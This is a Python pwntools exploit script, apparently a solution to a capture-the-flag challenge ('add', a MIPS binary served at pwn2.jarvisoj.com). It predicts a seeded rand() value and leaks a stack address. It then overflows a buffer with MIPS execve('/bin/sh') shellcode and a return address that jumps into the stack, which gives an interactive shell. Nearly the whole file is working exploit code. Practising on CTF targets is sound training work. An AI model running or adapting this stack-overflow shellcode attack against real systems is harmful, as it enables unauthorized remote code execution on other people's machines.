#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from ctypes import CDLL
import sys
context.binary = "./add"
context.log_level = "debug"

if sys.argv[1] == "l":
    io = process(["qemu-mipsel", "-L", "/usr/mipsel-linux-gnu", "./add"])
elif sys.argv[1] == "d":
    io = process(["qemu-mipsel", "-g", "1234", "-L", "/usr/mipsel-linux-gnu", "./add"])
else:
    io = remote("pwn2.jarvisoj.com", 9889)

if __name__ == "__main__":
    dll = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
    dll.srand(0x123456)
    key = dll.rand()

    io.sendlineafter("help.\n", str(key))
    io.recvuntil("Your input was ")
    stack = int(io.recvline().strip(), 16)
    success("stack -> {:#x}".format(stack))

    #  http://shell-storm.org/shellcode/files/shellcode-80.php
    shellcode = "\xff\xff\x10\x04\xab\x0f\x02\x24"
    shellcode += "\x55\xf0\x46\x20\x66\x06\xff\x23"
    shellcode += "\xc2\xf9\xec\x23\x66\x06\xbd\x23"
    shellcode += "\x9a\xf9\xac\xaf\x9e\xf9\xa6\xaf"
    shellcode += "\x9a\xf9\xbd\x23\x21\x20\x80\x01"
    shellcode += "\x21\x28\xa0\x03\xcc\xcd\x44\x03"
    shellcode += "/bin/sh\0"

    payload = '00000000' + shellcode.ljust(0x70 - 8, '0') + p32(stack + 8)
    io.sendline(payload)

    io.sendline("exit")

    io.interactive()
